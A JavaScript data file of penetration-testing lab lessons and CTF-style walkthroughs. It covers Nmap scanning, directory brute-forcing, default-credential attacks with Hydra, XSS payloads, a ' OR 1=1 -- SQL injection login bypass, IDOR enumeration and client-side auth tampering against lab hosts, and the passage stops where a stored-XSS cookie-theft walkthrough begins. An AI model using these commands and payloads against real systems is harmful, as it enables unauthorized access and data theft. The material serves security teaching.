export const LAB_DOCS = {
    "1": {
        title: "Host Discovery",
        sections: [
            { type: "text", content: "When we need to conduct an internal penetration test for the entire network of a company, for example, then we should, first of all, get an overview of which systems are online that we can work with. To actively discover such systems on the network, we can use various Nmap host discovery options. There are many options Nmap provides to determine whether our target is alive or not. The most effective host discovery method is to use ICMP echo requests, which we will look into." },
            { type: "text", content: "It is always recommended to store every single scan. This can later be used for comparison, documentation, and reporting. After all, different tools may produce different results. Therefore it can be beneficial to distinguish which tool produces which results." },
            { type: "subtitle", content: "Scan Network Range" },
            {
                type: "terminal",
                command: "sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d\" \" -f5",
                output: "10.129.2.4\n10.129.2.10\n10.129.2.11\n10.129.2.18\n10.129.2.19\n10.129.2.20\n10.129.2.28"
            },
            {
                type: "table",
                columns: ["Scanning Options", "Description"],
                rows: [
                    ["10.129.2.0/24", "Target network range."],
                    ["-sn", "Disables port scanning."],
                    ["-oA tnet", "Stores the results in all formats starting with the name 'tnet'."]
                ]
            },
            { type: "text", content: "This scanning method works only if the firewalls of the hosts allow it. Otherwise, we can use other scanning techniques to find out if the hosts are active or not. We will take a closer look at these techniques in \"Firewall and IDS Evasion\"." },
            { type: "subtitle", content: "Scan IP List" },
            { type: "text", content: "During an internal penetration test, it is not uncommon for us to be provided with an IP list with the hosts we need to test. Nmap also gives us the option of working with lists and reading the hosts from this list instead of manually defining or typing them in." },
            {
                type: "terminal",
                command: "cat hosts.lst",
                output: "10.129.2.4\n10.129.2.10\n10.129.2.11\n10.129.2.18\n10.129.2.19\n10.129.2.20\n10.129.2.28"
            },
            { type: "text", content: "If we use the same scanning technique on the predefined list, the command will look like this:" },
            {
                type: "terminal",
                command: "sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d\" \" -f5",
                output: "10.129.2.18\n10.129.2.19\n10.129.2.20"
            },
            {
                type: "table",
                columns: ["Scanning Options", "Description"],
                rows: [
                    ["-sn", "Disables port scanning."],
                    ["-oA tnet", "Stores the results in all formats starting with the name 'tnet'."],
                    ["-iL", "Performs defined scans against targets in provided 'hosts.lst' list."]
                ]
            },
            { type: "text", content: "In this example, we see that only 3 of 7 hosts are active. Remember, this may mean that the other hosts ignore the default ICMP echo requests because of their firewall configurations. Since Nmap does not receive a response, it marks those hosts as inactive." },
            { type: "subtitle", content: "Scan Multiple IPs" },
            { type: "text", content: "It can also happen that we only need to scan a small part of a network. An alternative to the method we used last time is to specify multiple IP addresses." },
            {
                type: "terminal",
                command: "sudo nmap -sn -oA tnet 10.129.2.18 10.129.2.19 10.129.2.20| grep for | cut -d\" \" -f5",
                output: "10.129.2.18\n10.129.2.19\n10.129.2.20"
            },
            { type: "text", content: "If these IP addresses are next to each other, we can also define the range in the respective octet." },
            {
                type: "terminal",
                command: "sudo nmap -sn -oA tnet 10.129.2.18-20| grep for | cut -d\" \" -f5",
                output: "10.129.2.18\n10.129.2.19\n10.129.2.20"
            },
            { type: "subtitle", content: "Scan Single IP" },
            { type: "text", content: "Before we scan a single host for open ports and its services, we first have to determine if it is alive or not. For this, we can use the same method as before." },
            {
                type: "terminal",
                command: "sudo nmap 10.129.2.18 -sn -oA host",
                output: "Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-14 23:59 CEST\nNmap scan report for 10.129.2.18\nHost is up (0.087s latency).\nMAC Address: DE:AD:00:00:BE:EF\nNmap done: 1 IP address (1 host up) scanned in 0.11 seconds"
            },
            {
                type: "table",
                columns: ["Scanning Options", "Description"],
                rows: [
                    ["10.129.2.18", "Performs defined scans against the target."],
                    ["-sn", "Disables port scanning."],
                    ["-oA host", "Stores the results in all formats starting with the name 'host'."]
                ]
            },
            { type: "text", content: "If we disable port scan (-sn), Nmap automatically ping scan with ICMP Echo Requests (-PE). Once such a request is sent, we usually expect an ICMP reply if the pinging host is alive. The more interesting fact is that our previous scans did not do that because before Nmap could send an ICMP echo request, it would send an ARP ping resulting in an ARP reply. We can confirm this with the \"--packet-trace\" option. To ensure that ICMP echo requests are sent, we also define the option (-PE) for this." },
            {
                type: "terminal",
                command: "sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace",
                output: "Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 00:08 CEST\nSENT (0.0074s) ARP who-has 10.129.2.18 tell 10.10.14.2\nRCVD (0.0309s) ARP reply 10.129.2.18 is-at DE:AD:00:00:BE:EF\nNmap scan report for 10.129.2.18\nHost is up (0.023s latency).\nMAC Address: DE:AD:00:00:BE:EF\nNmap done: 1 IP address (1 host up) scanned in 0.05 seconds"
            },
            {
                type: "table",
                columns: ["Scanning Options", "Description"],
                rows: [
                    ["10.129.2.18", "Performs defined scans against the target."],
                    ["-sn", "Disables port scanning."],
                    ["-oA host", "Stores the results in all formats starting with the name 'host'."],
                    ["-PE", "Performs the ping scan by using 'ICMP Echo requests' against the target."],
                    ["--packet-trace", "Shows all packets sent and received"]
                ]
            }
        ]
    },
    "2": {
        title: "Version Detection",
        sections: [
            { type: "text", content: "After identifying which hosts are alive on the network, the next step in a penetration test is service enumeration. Service enumeration helps us determine what services are running on open ports and which versions of those services are in use. This information is critical, as outdated or vulnerable service versions may be exploitable." },
            { type: "text", content: "Nmap provides a powerful version detection feature using the -sV option. This allows Nmap to probe open ports and extract banner information to identify service names, versions, and sometimes the operating system or software details." },
            { type: "text", content: "As with all scanning phases, it is recommended to store all scan results for later analysis, reporting, and comparison." },
            { type: "subtitle", content: "Scan Single Host for Version Detection" },
            { type: "text", content: "Once a host is confirmed to be alive, we can scan it for open ports and running services along with their versions." },
            {
                type: "terminal",
                command: "sudo nmap -sV 10.129.2.18 -oA version_scan",
                output: "PORT     STATE SERVICE VERSION\n21/tcp   open  ftp     vsftpd 3.0.3\n22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4\n80/tcp   open  http    Apache httpd 2.4.29"
            },
            {
                type: "table",
                columns: ["Option", "Description"],
                rows: [
                    ["-sV", "Enables service and version detection."],
                    ["10.129.2.18", "Target IP address."],
                    ["-oA version_scan", "Stores results in all formats starting with the name version_scan."]
                ]
            },
            { type: "text", content: "This scan allows us to identify running services and their versions, which can later be cross-checked against known vulnerabilities." },
            { type: "subtitle", content: "Scan Multiple Hosts for Version Detection" },
            { type: "text", content: "If multiple hosts are active, we can perform version detection against all of them at once." },
            {
                type: "terminal",
                command: "sudo nmap -sV 10.129.2.18 10.129.2.19 10.129.2.20 -oA version_multi",
                output: "Scanning 3 hosts...\n10.129.2.18: 21/ftp, 22/ssh, 80/http\n10.129.2.19: 22/ssh, 80/http, 443/https\n10.129.2.20: 80/http, 8080/http-proxy"
            },
            { type: "text", content: "This approach is useful when targeting a small set of known systems within the network." },
            { type: "subtitle", content: "Scan Network Range for Version Detection" },
            { type: "text", content: "We can also perform version detection across an entire subnet. However, this method is time-consuming and should be used carefully, especially in production environments." },
            {
                type: "terminal",
                command: "sudo nmap -sV 10.129.2.0/24 -oA version_range",
                output: "Starting Nmap 7.80...\nNmap scan report for 10.129.2.18\nHost is up.\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.29\n...\nNmap done: 256 IP addresses (7 hosts up) scanned"
            },
            {
                type: "table",
                columns: ["Option", "Description"],
                rows: [
                    ["10.129.2.0/24", "Target network range."],
                    ["-sV", "Enables version detection."],
                    ["-oA version_range", "Saves results in all output formats."]
                ]
            },
            { type: "subtitle", content: "Increase Version Detection Accuracy" },
            { type: "text", content: "Nmap allows us to control how aggressively it probes services using the --version-intensity option." },
            {
                type: "terminal",
                command: "sudo nmap -sV --version-intensity 9 10.129.2.18 -oA version_intense",
                output: "Starting Nmap 7.80...\nService scan intensity 9 (aggressive probing)\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.29 (Custom build)"
            },
            {
                type: "table",
                columns: ["Option", "Description"],
                rows: [
                    ["--version-intensity 9", "Performs aggressive version probing (range: 0–9)."]
                ]
            },
            { type: "text", content: "Higher intensity may reveal more accurate service information but increases scan time and network noise." },
            { type: "subtitle", content: "Aggressive Scan with Version Detection" },
            { type: "text", content: "For deeper enumeration, version detection can be combined with additional scanning techniques." },
            {
                type: "terminal",
                command: "sudo nmap -A 10.129.2.18 -oA aggressive_scan",
                output: "Starting Nmap 7.80...\nPORT   STATE SERVICE VERSION\n22/ssh OpenSSH 7.6p1\n80/http Apache 2.4.29\nOS details: Linux 4.15 - 5.6"
            },
            {
                type: "table",
                columns: ["Option", "Description"],
                rows: [
                    ["-A", "Enables OS detection, version detection, script scanning, and traceroute."]
                ]
            },
            { type: "text", content: "This method provides extensive information but is noisy and more likely to be detected by IDS/IPS systems." },
            { type: "subtitle", content: "Conclusion" },
            { type: "text", content: "Version detection is a crucial phase in service enumeration, allowing penetration testers to identify running services and their exact versions. This information helps in vulnerability assessment and exploit selection. However, aggressive scans should be performed cautiously to avoid detection and disruption of services." }
        ]
    },
    "3": {
        title: "Robots.txt Information Leak",
        sections: [
            { type: "text", content: "During web application enumeration, it is important to identify files that may unintentionally disclose sensitive information. One such file is robots.txt, which is commonly used to instruct web crawlers (search engine bots) about which directories or files should not be indexed." },
            { type: "text", content: "Although robots.txt is meant for search engines, it is publicly accessible and can reveal hidden or sensitive paths, such as admin panels, backup directories, or internal resources. Attackers can use this information to further enumerate the web application." },
            { type: "subtitle", content: "Accessing Robots.txt File" },
            { type: "text", content: "The robots.txt file is usually located in the root directory of a web server and can be accessed directly via a web browser or command-line tools." },
            { type: "text", content: "Using Web Browser: http://10.129.2.18/robots.txt" },
            { type: "text", content: "If the file exists, the server will return its contents." },
            { type: "subtitle", content: "Accessing Robots.txt Using Terminal" },
            { type: "text", content: "We can also retrieve the robots.txt file using command-line tools such as curl or wget." },
            {
                type: "terminal",
                command: "curl http://10.129.2.18/robots.txt",
                output: "User-agent: *\nDisallow: /admin/\nDisallow: /backup/\nDisallow: /private/"
            },
            {
                type: "terminal",
                command: "wget http://10.129.2.18/robots.txt",
                output: "--2020-06-15 10:00:00--  http://10.129.2.18/robots.txt\nConnecting to 10.129.2.18:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 68 [text/plain]\nSaving to: 'robots.txt'"
            },
            { type: "subtitle", content: "Information Disclosure Analysis" },
            { type: "text", content: "From the robots.txt file, we can identify directories that the website owner does not want indexed by search engines. However, these directories may still be accessible to users." },
            {
                type: "table",
                columns: ["Potential Risks", "Description"],
                rows: [
                    ["Hidden Directories", "Disclosure of paths not intended for public discovery."],
                    ["Admin Panels", "Exposure of administrative interfaces."],
                    ["Backup Files", "Discovery of sensitive configuration or backup data."],
                    ["Attack Surface", "Increased surface for further targeted enumeration."]
                ]
            },
            { type: "text", content: "These paths can be manually tested in a browser or scanned using additional tools to check for access permissions." },
            { type: "subtitle", content: "Verification of Disallowed Directories" },
            { type: "text", content: "Once suspicious directories are found, they can be manually accessed to verify if they are reachable." },
            { type: "text", content: "Example: http://10.129.2.18/admin/ or http://10.129.2.18/backup/" },
            { type: "text", content: "If accessible, these directories may lead to sensitive information leakage or further exploitation." },
            { type: "subtitle", content: "Conclusion" },
            { type: "text", content: "The robots.txt file should never be relied upon as a security mechanism. While it helps control search engine indexing, it can unintentionally expose sensitive directories to attackers. During penetration testing, reviewing robots.txt is a simple yet effective method for discovering hidden application paths." }
        ]
    },
    "4": {
        title: "Hidden Directory Discovery",
        sections: [
            { type: "text", content: "Hidden directory discovery is a web enumeration technique used to identify unlisted or hidden directories and files on a web server. These directories are often not directly linked on the website but may still be accessible. Such directories can contain administrative panels, backups, configuration files, or development resources, which may lead to sensitive information disclosure." },
            { type: "text", content: "This technique is commonly performed using directory brute-forcing tools with predefined wordlists." },
            { type: "subtitle", content: "Directory Enumeration Using Gobuster" },
            { type: "text", content: "Gobuster is a fast and effective tool used to brute-force directories and files on web servers using wordlists." },
            {
                type: "terminal",
                command: "gobuster dir -u http://10.129.2.18/ -w /usr/share/wordlists/dirb/common.txt -o gobuster_scan.txt",
                output: "/admin        (Status: 301)\n/backup       (Status: 200)\n/uploads      (Status: 200)\n/test         (Status: 403)"
            },
            {
                type: "table",
                columns: ["Option", "Description"],
                rows: [
                    ["dir", "Enables directory brute-force mode."],
                    ["-u", "Specifies the target URL."],
                    ["-w", "Specifies the wordlist used for directory enumeration."],
                    ["-o", "Saves the scan output to a file."]
                ]
            },
            { type: "subtitle", content: "Analysis of Discovered Directories" },
            { type: "text", content: "The discovered directories may reveal valuable information depending on their access permissions." },
            {
                type: "table",
                columns: ["Status Code", "Meaning"],
                rows: [
                    ["200", "Directory is accessible."],
                    ["301/302", "Redirected directory."],
                    ["403", "Access forbidden but directory exists."],
                    ["404", "Directory not found."]
                ]
            },
            { type: "text", content: "Even directories returning 403 Forbidden confirm their existence and may be exploitable through other techniques." },
            { type: "subtitle", content: "Directory Enumeration Using Dirb" },
            { type: "text", content: "An alternative tool for hidden directory discovery is Dirb, which performs similar brute-force scanning." },
            {
                type: "terminal",
                command: "dirb http://10.129.2.18/",
                output: "-----------------\nDIRB v2.22    \nBy DarkRaoul\n-----------------\n\nOUTPUT: http://10.129.2.18/\n(UP) http://10.129.2.18/ (CODE: 200|SIZE: 11321)\n==> DIRECTORY: http://10.129.2.18/admin/\n==> DIRECTORY: http://10.129.2.18/backup/"
            },
            { type: "text", content: "Dirb uses a default wordlist and provides quick results for initial enumeration." },
            { type: "subtitle", content: "Verification of Discovered Directories" },
            { type: "text", content: "Once hidden directories are identified, they should be manually tested through a browser or further tools." },
            { type: "text", content: "Example: http://10.129.2.18/backup/ or http://10.129.2.18/uploads/" },
            { type: "text", content: "If accessible, these directories may expose sensitive files or allow further attacks such as file upload exploitation." },
            { type: "subtitle", content: "Conclusion" },
            { type: "text", content: "Hidden directory discovery is a critical phase in web application enumeration. Many web applications expose sensitive directories due to misconfigurations or leftover development files. Identifying these directories allows penetration testers to expand the attack surface and uncover potential vulnerabilities." }
        ]
    },
    "5": {
        title: "Default Credentials Abuse",
        sections: [
            { type: "text", content: "Default credentials abuse is a common security issue where systems, applications, or services are deployed with unchanged default usernames and passwords. Many software products ship with predefined credentials for initial setup, and if these credentials are not changed, attackers can easily gain unauthorized access." },
            { type: "text", content: "This issue is frequently observed in admin panels, routers, web applications, databases, and IoT devices, making it a critical risk during penetration testing." },
            { type: "subtitle", content: "Identifying Login Interfaces" },
            { type: "text", content: "Before attempting default credentials, it is necessary to identify authentication points such as login pages or admin panels." },
            { type: "text", content: "Common login paths: /login, /admin, /admin/login" },
            { type: "text", content: "These pages are commonly discovered through directory enumeration or robots.txt analysis." },
            { type: "subtitle", content: "Testing Default Credentials" },
            { type: "text", content: "Once a login interface is identified, known default credentials can be tested manually. This process should be done carefully to avoid account lockouts or detection." },
            {
                type: "table",
                columns: ["Username", "Password"],
                rows: [
                    ["admin", "admin"],
                    ["admin", "password"],
                    ["admin", "123456"],
                    ["root", "root"],
                    ["user", "user"]
                ]
            },
            { type: "text", content: "Example Attempt: Username: admin | Password: admin. If successful, it confirms a default credentials vulnerability." },
            { type: "subtitle", content: "Testing Default Credentials Using Tools" },
            { type: "text", content: "In some cases, tools can be used to automate default credential testing." },
            {
                type: "terminal",
                command: "hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form \"/login.php:user=^USER^&pass=^PASS^:Invalid\"",
                output: "[80][http-post-form] host: 10.129.2.18   login: admin   password: admin\n1 of 1 target successfully completed, 1 valid password found"
            },
            { type: "text", content: "⚠️ Automated attacks should only be performed with proper authorization." },
            { type: "subtitle", content: "Impact of Default Credentials Abuse" },
            {
                type: "table",
                columns: ["Impact", "Description"],
                rows: [
                    ["Admin Access", "Complete control over the application or service."],
                    ["Data Manipulation", "Modify, delete, or steal sensitive information."],
                    ["Privilege Escalation", "Use access to move deeper into the network."],
                    ["Full Compromise", "Potential to take over the entire server instance."]
                ]
            },
            { type: "subtitle", content: "Mitigation Recommendations" },
            { type: "text", content: "1. Change all default usernames and passwords immediately after installation.\n2. Enforce strong password policies.\n3. Implement account lockout mechanisms to prevent brute-force.\n4. Use multi-factor authentication (MFA).\n5. Restrict admin access by IP where possible." },
            { type: "subtitle", content: "Conclusion" },
            { type: "text", content: "Default credentials abuse is a high-risk vulnerability caused by poor security practices. It is easy to exploit and often leads to full system compromise. During penetration testing, checking for default credentials is a simple but highly effective technique." }
        ]
    },
    "6": {
        title: "DOM-Based Cross-Site Scripting (XSS)",
        sections: [
            { type: "text", content: "DOM-Based Cross-Site Scripting (XSS) is a client-side vulnerability that occurs when JavaScript running in the browser processes untrusted user input and writes it directly into the Document Model (DOM) without proper sanitization or validation. Unlike reflected or stored XSS, DOM-based XSS does not require server-side involvement, making it harder to detect using traditional server-side security controls." },
            { type: "text", content: "This vulnerability can allow attackers to execute arbitrary JavaScript in the victim’s browser." },
            { type: "subtitle", content: "Identifying Potential DOM XSS Entry Points" },
            { type: "text", content: "DOM-based XSS commonly occurs when web applications use JavaScript to read data from the URL or browser objects such as: document.URL, document.location, location.href, location.search, document.referrer." },
            { type: "text", content: "Common insecure sinks: innerHTML, document.write(), eval()." },
            { type: "subtitle", content: "Manual Testing for DOM-Based XSS" },
            { type: "text", content: "To test for DOM-based XSS, we can inject JavaScript payloads into URL parameters and observe how the application processes them." },
            {
                type: "terminal",
                command: "http://10.129.2.18/search.html?q=<script>alert(1)</script>",
                output: "Alert box with '1' appears in the browser if vulnerable."
            },
            { type: "subtitle", content: "Example Vulnerable Code" },
            {
                type: "terminal",
                command: "var query = location.search;\ndocument.getElementById(\"output\").innerHTML = query;",
                output: "In this example, user-controlled input from the URL is directly injected into the DOM without sanitization, allowing script execution."
            },
            { type: "subtitle", content: "Impact of DOM-Based XSS" },
            {
                type: "table",
                columns: ["Impact", "Description"],
                rows: [
                    ["Script Execution", "Execute malicious JavaScript in the victim's session."],
                    ["Session Theft", "Steal sensitive cookies and session tokens."],
                    ["Phishing/Redirection", "Redirect users to malicious landing pages."],
                    ["Data Capture", "Log keystrokes or capture form data."]
                ]
            },
            { type: "subtitle", content: "Mitigation Recommendations" },
            { type: "text", content: "1. Avoid using dangerous JavaScript sinks like innerHTML.\n2. Use safe alternatives such as textContent.\n3. Validate and sanitize all client-side input.\n4. Implement Content Security Policy (CSP).\n5. Encode output before inserting into the DOM." },
            { type: "subtitle", content: "Conclusion" },
            { type: "text", content: "DOM-Based XSS is a critical client-side vulnerability caused by insecure JavaScript handling of user input. Because the attack occurs entirely in the browser, it can bypass server-side protections. During penetration testing, careful inspection of client-side scripts is essential to identify and mitigate this vulnerability." }
        ]
    },
    "7": {
        title: "Stored Cross-Site Scripting (XSS) via Client-Side Storage",
        sections: [
            { type: "text", content: "Stored XSS via client-side storage occurs when malicious JavaScript payloads are stored in the browser’s storage mechanisms, such as LocalStorage, SessionStorage, or IndexedDB, and later retrieved and rendered by the application without proper sanitization. Unlike traditional stored XSS, the payload is not stored on the server but persists in the client’s browser." },
            { type: "text", content: "This type of vulnerability is particularly dangerous because the malicious script executes every time the affected page loads, impacting the same user repeatedly." },
            { type: "subtitle", content: "Understanding Client-Side Storage" },
            { type: "text", content: "Modern web applications commonly use client-side storage to improve performance and user experience." },
            {
                type: "table",
                columns: ["Storage Type", "Description"],
                rows: [
                    ["LocalStorage", "Persistent storage, survives browser restarts."],
                    ["SessionStorage", "Temporary storage, cleared when the tab closes."],
                    ["IndexedDB", "Structured client-side database."]
                ]
            },
            { type: "text", content: "If data from these storage mechanisms is inserted into the DOM without sanitization, it can lead to stored XSS." },
            { type: "subtitle", content: "Identifying Vulnerable Functionality" },
            { type: "text", content: "Stored XSS via client storage is often found in features such as: User preferences (theme, username, language), Search history, Chat drafts or comments saved locally, Form auto-save functionality." },
            { type: "subtitle", content: "Manual Testing for Stored XSS via Client Storage" },
            { type: "text", content: "Step 1: Inject Payload into Client Storage using the browser developer console." },
            {
                type: "terminal",
                command: "localStorage.setItem(\"username\", \"<script>alert('XSS')</script>\");",
                output: "Payload stored in LocalStorage."
            },
            { type: "text", content: "Step 2: Trigger Payload Execution by reloading the page or navigating to the functionality that reads from storage." },
            { type: "subtitle", content: "Example Vulnerable Code" },
            {
                type: "terminal",
                command: "var name = localStorage.getItem(\"username\");\ndocument.getElementById(\"welcome\").innerHTML = name;",
                output: "This code directly writes untrusted data from LocalStorage into the DOM, resulting in stored XSS."
            },
            { type: "subtitle", content: "Impact of Stored XSS via Client Storage" },
            {
                type: "table",
                columns: ["Impact", "Description"],
                rows: [
                    ["Persistent Execution", "Malicious scripts execute every time the user visits."],
                    ["Auth Token Theft", "Steal authentication or session tokens from storage."],
                    ["Victim Impersonation", "Perform actions on behalf of the victim."],
                    ["Data Manipulation", "Manipulate application behavior or data."]
                ]
            },
            { type: "subtitle", content: "Mitigation Recommendations" },
            { type: "text", content: "1. Never trust client-side storage data.\n2. Sanitize and validate data before storage and output.\n3. Use textContent instead of innerHTML.\n4. Implement strict Content Security Policy (CSP).\n5. Clear unused or outdated client-side storage." },
            { type: "subtitle", content: "Conclusion" },
            { type: "text", content: "Stored XSS via client-side storage is a dangerous vulnerability caused by improper handling of locally stored data. Because the payload persists across sessions and reloads, it can repeatedly affect users without server interaction. Proper client-side input validation and secure DOM manipulation are essential to prevent this issue." }
        ]
    },
    "8": {
        title: "Client-Side Authentication Bypass",
        sections: [
            { type: "text", content: "Client-side authentication bypass occurs when authentication or authorization logic is implemented only in client-side code, such as JavaScript, instead of being properly enforced on the server. Since client-side code can be viewed, modified, or bypassed by an attacker, relying on it for access control is insecure." },
            { type: "text", content: "This vulnerability allows attackers to gain unauthorized access to protected areas without valid credentials." },
            { type: "subtitle", content: "Understanding Client-Side Authentication" },
            { type: "text", content: "In vulnerable applications, authentication checks may be performed using: JavaScript conditions, Hidden form fields, Cookies or LocalStorage values, URL parameters." },
            { type: "text", content: "Because these controls run in the browser, attackers can manipulate them using developer tools." },
            { type: "subtitle", content: "Identifying Client-Side Authentication Logic" },
            { type: "text", content: "Client-side authentication bypass is often discovered by inspecting JavaScript files or HTML source code." },
            { type: "text", content: "Example Indicators: Login checks implemented in JS, authentication based on LocalStorage, redirects controlled by client-side conditions." },
            { type: "subtitle", content: "Manual Authentication Bypass Using Developer Tools" },
            { type: "text", content: "Example Scenario: The application checks login status using LocalStorage." },
            {
                type: "terminal",
                command: "localStorage.setItem(\"isLoggedIn\", \"true\");",
                output: "Status set to logged in. Access granted upon refresh."
            },
            { type: "subtitle", content: "Authentication Bypass via Hidden Fields" },
            { type: "text", content: "Some applications rely on hidden form fields to verify user roles: <input type='hidden' name='role' value='user'>. Modifying this to 'admin' using developer tools can grant elevated access." },
            { type: "subtitle", content: "Impact of Client-Side Authentication Bypass" },
            {
                type: "table",
                columns: ["Impact", "Description"],
                rows: [
                    ["Restricted Access", "Access sensitive or administrative pages."],
                    ["Login Bypass", "Bypass authentication mechanisms entirely."],
                    ["Privilege Escalation", "Gain higher-level permissions (e.g., admin)."],
                    ["Data Exposure", "View or modify sensitive user and system data."]
                ]
            },
            { type: "subtitle", content: "Mitigation Recommendations" },
            { type: "text", content: "1. Enforce authentication and authorization on the server side.\n2. Never trust client-side checks for access control.\n3. Validate sessions on every request.\n4. Use secure, server-managed session tokens.\n5. Implement proper role-based access control (RBAC)." },
            { type: "subtitle", content: "Conclusion" },
            { type: "text", content: "Client-Side Authentication Bypass is a critical vulnerability caused by improper trust in client-side logic. Since client-side code can be easily manipulated, all authentication and authorization decisions must be handled securely on the server. During penetration testing, reviewing client-side logic is essential to identify this weakness." }
        ]
    },
    // Red Team Operational Walkthroughs (Starting at 101)
    "101": {
        title: "Walkthrough: Exposed Backup File",
        sections: [
            { type: "text", content: "Hey there, Ops! This challenge is all about a common developer mistake: leaving a backup file where everyone can see it. Let's find it step-by-step!" },
            { type: "subtitle", content: "Step 1: Find the machine" },
            { type: "text", content: "First, we need to make sure the target is awake. We use a tool called 'nmap'. It's like knocking on the door to see if anyone is home." },
            {
                type: "terminal",
                command: "nmap http://target.local",
                output: "PORT     STATE SERVICE\n80/tcp   open  http\n22/tcp   open  ssh"
            },
            { type: "subtitle", content: "Step 2: Looking for the secret file" },
            { type: "text", content: "Developers often name their backups something simple like 'backup.zip'. Let's ask the server if it has that file using 'curl'. Imagine 'curl' is like a grabby hand that reaches into the server." },
            {
                type: "terminal",
                command: "curl http://target.local/backup.zip --output backup.zip",
                output: "100% [================================================>] 2.4MB\n[+] Saved to backup.zip"
            },
            { type: "subtitle", content: "Step 3: Opening the present" },
            { type: "text", content: "Now we have a zip file. We need to open it up! Use the 'unzip' command. It's like unboxing a package." },
            {
                type: "terminal",
                command: "unzip backup.zip",
                output: "extracting: config.php\nextracting: database.sql"
            },
            { type: "subtitle", content: "Step 4: Reading the secrets" },
            { type: "text", content: "Inside we found 'config.php'. This is where the website keeps its deep secrets, like passwords. Use 'cat' to read it. 'cat' stands for concatenate, but we use it to peek inside files." },
            {
                type: "terminal",
                command: "cat config.php",
                output: "<?php\n$db_user = 'astranova_admin';\n$db_pass = 'Sup3rS3cretP@ss';\n$hidden_admin_path = '/admin/';"
            },
            { type: "subtitle", content: "Step 5: Entering the Admin Room" },
            { type: "text", content: "Now use those credentials! Use 'curl' with the '-u' flag (stands for User) to say 'Hi, I'm the admin!'. The server will check your ID and give you the flag!" },
            {
                type: "terminal",
                command: "curl -u astranova_admin:Sup3rS3cretP@ss http://target.local/admin/",
                output: "Welcome Admin. FLAG{backup_exposure_mastered}"
            }
        ]
    },
    "Robots.txt Leak": {
        title: "Walkthrough: Robots.txt Leak",
        sections: [
            { type: "text", content: "Websites have a file called 'robots.txt'. It's like a note left for Google bots saying 'Hey, please don't look here!'. But guess what? We can read that note too!" },
            { type: "subtitle", content: "Step 1: Read the Note" },
            { type: "text", content: "Use 'curl' to read the file. It's usually right in the front yard of the website." },
            {
                type: "terminal",
                command: "curl http://target.local/robots.txt",
                output: "User-agent: *\nDisallow: /super-secret-folder-99/"
            },
            { type: "subtitle", content: "Step 2: Go where you're not allowed" },
            { type: "text", content: "The note said 'Disallow: /super-secret-folder-99/'. That sounds interesting! Let's go there anyway using our browser or curl." },
            {
                type: "terminal",
                command: "curl http://target.local/super-secret-folder-99/",
                output: "Welcome to the Private Stash.\n\nFLAG{robots_never_hide_secrets}"
            }
        ]
    },
    "SQL Injection Login Bypass": {
        title: "Walkthrough: SQL Injection Bypass",
        sections: [
            { type: "text", content: "SQL Injection is like a mind-control trick for databases. We're going to use special symbols to make the database 'forget' to check our password. Let's start the mission!" },
            { type: "subtitle", content: "Step 1: Check the Doors" },
            { type: "text", content: "We'll use 'nmap' to see if the target allows web connections (Port 80)." },
            {
                type: "terminal",
                command: "nmap http://target.local",
                output: "PORT     STATE SERVICE\n80/tcp   open  http\n22/tcp   open  ssh"
            },
            { type: "subtitle", content: "Step 2: Find the Entry Way" },
            { type: "text", content: "We need a login page. We'll use 'gobuster' to scan for a login file." },
            {
                type: "terminal",
                command: "gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt",
                output: "/index.php            (Status: 200)\n/login.php            (Status: 200)\n/robots.txt           (Status: 200)"
            },
            { type: "subtitle", content: "Step 3: The 'Always True' Magic" },
            { type: "text", content: "Now we go to 'login.php' and give it a special username: ' OR 1=1 --. In database language, 1 is always equal to 1, so the database says 'This is true, come on in!'" },
            {
                type: "terminal",
                command: "curl -X POST -d \"user=' OR 1=1 --&pass=fake\" http://target.local/login.php",
                output: "Welcome Admin! Authentication successful.\nFLAG{classic_sqli_bypass}"
            }
        ]
    },
    "IDOR - Insecure Direct Object Reference": {
        title: "Walkthrough: IDOR Data Exposure",
        sections: [
            { type: "text", content: "Imagine a hotel where every room key is just a number. If you have key #105, you might be curious if key #1 works too! That's IDOR. Let's find some admin data." },
            { type: "subtitle", content: "Step 1: Recon" },
            { type: "text", content: "First, let's look for any hidden directories that might lead to an API." },
            {
                type: "terminal",
                command: "gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt",
                output: "/index.php            (Status: 200)\n/api                  (Status: 301)\n/assets               (Status: 301)"
            },
            { type: "subtitle", content: "Step 2: Peek at your own profile" },
            { type: "text", content: "We found an '/api' folder. Let's see how the website asks for a user profile. It uses an ID number!" },
            {
                type: "terminal",
                command: "curl http://target.local/api/user/v1/profile?id=105",
                output: "{\"id\": 105, \"name\": \"User_105\", \"role\": \"customer\"}"
            },
            { type: "subtitle", content: "Step 3: Accessing the Admin's Room" },
            { type: "text", content: "Usually, the very first user (ID 1) is the admin. Let's change our ID number to 1 and see if the server is tricked into giving us the admin's secret flag!" },
            {
                type: "terminal",
                command: "curl http://target.local/api/user/v1/profile?id=1",
                output: "{\"id\": 1, \"name\": \"astranova_root\", \"flag\": \"FLAG{idor_data_exposure}\"}"
            }
        ]
    },
    "Stored XSS → Admin Cookie Theft": {
        title: "Walkthrough: Stored XSS Cookie Theft",
        sections: [
            { type: "text", content: "Stored XSS is a high-impact attack where we leave a malicious script permanently on the server. When an administrator views the data, our script runs in their browser and steals their session! Let's do this like a pro." },
            { type: "subtitle", content: "Step 1: Initial Reconnaissance" },
            { type: "text", content: "First, let's verify church target services are running. We'll use 'nmap' to scan for open ports." },
            {
                type: "terminal",
                command: "nmap http://target.local",
                output: "PORT     STATE SERVICE\n80/tcp   open  http\n22/tcp   open  ssh"
            },
            { type: "subtitle", content: "Step 2: Hunting for Hidden Pages" },
            { type: "text", content: "We know there's a website, but where can we submit data? We'll use 'gobuster' to find hidden files and directories." },
            {
                type: "terminal",
                command: "gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt",
                output: "/index.php            (Status: 200)\n/admin                (Status: 301)\n/contact.php          (Status: 200)\n/robots.txt           (Status: 200)"
            },
            { type: "subtitle", content: "Step 3: Planting the Payload" },
